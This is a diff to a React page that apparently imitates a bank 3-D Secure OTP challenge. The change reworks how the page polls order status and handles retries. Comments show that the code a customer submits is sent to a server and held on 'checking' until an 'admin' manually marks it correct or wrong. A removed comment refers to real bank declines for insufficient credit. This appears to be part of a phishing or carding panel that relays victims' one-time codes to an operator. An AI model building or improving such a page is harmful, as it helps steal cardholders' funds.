@@ -1,4 +1,4 @@
-import React, { useCallback, useEffect, useMemo, useState } from 'react';
+import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
 import { apiUrl } from '../lib/apiBase';
 
@@ -12,6 +12,8 @@ type Poll = {
   otp_resend_cooldown_sec?: number;
   fail_reason?: string | null;
 };
+
+type OtpUiState = 'input' | 'checking' | 'failed' | 'completed' | 'declined';
 
 function qs() {
   return new URLSearchParams(window.location.search);
@@ -32,10 +34,13 @@ export default function AcsChallengePage() {
   const [otpResendNotice, setOtpResendNotice] = useState(false);
   const [otpResendCooldown, setOtpResendCooldown] = useState(0);
   const [otpResendLoading, setOtpResendLoading] = useState(false);
-  const [otpState, setOtpState] = useState<
-    'input' | 'checking' | 'failed' | 'completed' | 'declined'
-  >('input');
+  const [otpState, setOtpState] = useState<OtpUiState>('input');
   const [failReason, setFailReason] = useState<string | null>(null);
+
+  /** Last polled order status — used to detect transitions only */
+  const prevStatusRef = useRef('');
+  /** True after customer submits an OTP until admin marks correct/wrong/fail */
+  const waitingResultRef = useRef(false);
 
   const goBack = useCallback(
     (status: string) => {
@@ -77,29 +82,53 @@ export default function AcsChallengePage() {
           setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
         }
         if (data.fail_reason) setFailReason(data.fail_reason);
+
         const st = String(data.status || '').toLowerCase();
+        const prev = prevStatusRef.current;
+
         if (st === 'completed') {
-          // Only now leave Verify → show redirect, then return to merchant
+          waitingResultRef.current = false;
+          prevStatusRef.current = st;
           setOtpState('completed');
           window.setTimeout(() => goBack('completed'), 900);
           return;
         }
+
         if (st === 'failed' || st === 'refunded' || st === 'suspended') {
+          waitingResultRef.current = false;
+          prevStatusRef.current = st;
           if (data.fail_reason === 'otp_attempts_exceeded') {
             setOtpState('failed');
             setFailReason('otp_attempts_exceeded');
           } else {
-            // Correct OTP but bank declined / insufficient credit → redirect page message + home 10s
             setOtpState('declined');
             setFailReason(data.fail_reason || 'declined');
           }
           return;
         }
+
         if (st === 'retry_otp') {
-          // Wrong code: stay on Verify with error — never redirect page first
-          setOtpState('input');
-          setOtpRetryNotice(true);
+          // Only handle NEW transition into retry_otp (wrong OTP result).
+          // Do NOT re-fire every poll while status stays retry_otp — that breaks 2nd OTP.
+          if (prev !== 'retry_otp') {
+            waitingResultRef.current = false;
+            setOtpState('input');
+            setOtpRetryNotice(true);
+          }
+          prevStatusRef.current = st;
+          return;
         }
+
+        // pending / awaiting_otp after customer submitted — keep "---" / checking
+        if (st === 'pending' || st === 'awaiting_otp') {
+          prevStatusRef.current = st;
+          if (waitingResultRef.current) {
+            setOtpState('checking');
+          }
+          return;
+        }
+
+        prevStatusRef.current = st;
       } catch {
         /* ignore */
       }
@@ -120,7 +149,6 @@ export default function AcsChallengePage() {
 
   const onMethodNext = async () => {
     if (!orderRef) return;
-    // fire-and-forget — UI already advances in AcsOtpChallenge
     await fetch(apiUrl('/api/transactions/otp/method-next'), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -132,6 +160,7 @@ export default function AcsChallengePage() {
     if (!orderRef) return;
     setOtpRetryNotice(false);
     setOtpResendNotice(false);
+    waitingResultRef.current = true;
     setOtpState('checking');
     const res = await fetch(apiUrl('/api/transactions/otp'), {
       method: 'POST',
@@ -139,9 +168,15 @@ export default function AcsChallengePage() {
       body: JSON.stringify({ order_id: orderRef, otpDigit: code }),
     });
     if (!res.ok) {
+      waitingResultRef.current = false;
       setOtpState('input');
       throw new Error('otp failed');
     }
+    // Stay on checking until admin: completed / retry_otp / declined
+  };
+
+  const onClearRetryNotice = () => {
+    setOtpRetryNotice(false);
   };
 
   const onResend = async () => {
@@ -177,6 +212,7 @@ export default function AcsChallengePage() {
         failReason={failReason}
         onMethodNext={onMethodNext}
         onSubmitOtp={onSubmitOtp}
+        onClearRetryNotice={onClearRetryNotice}
         onResend={onResend}
         onRetry={() => goBack('failed')}
         onCancel={() => goBack('cancelled')}
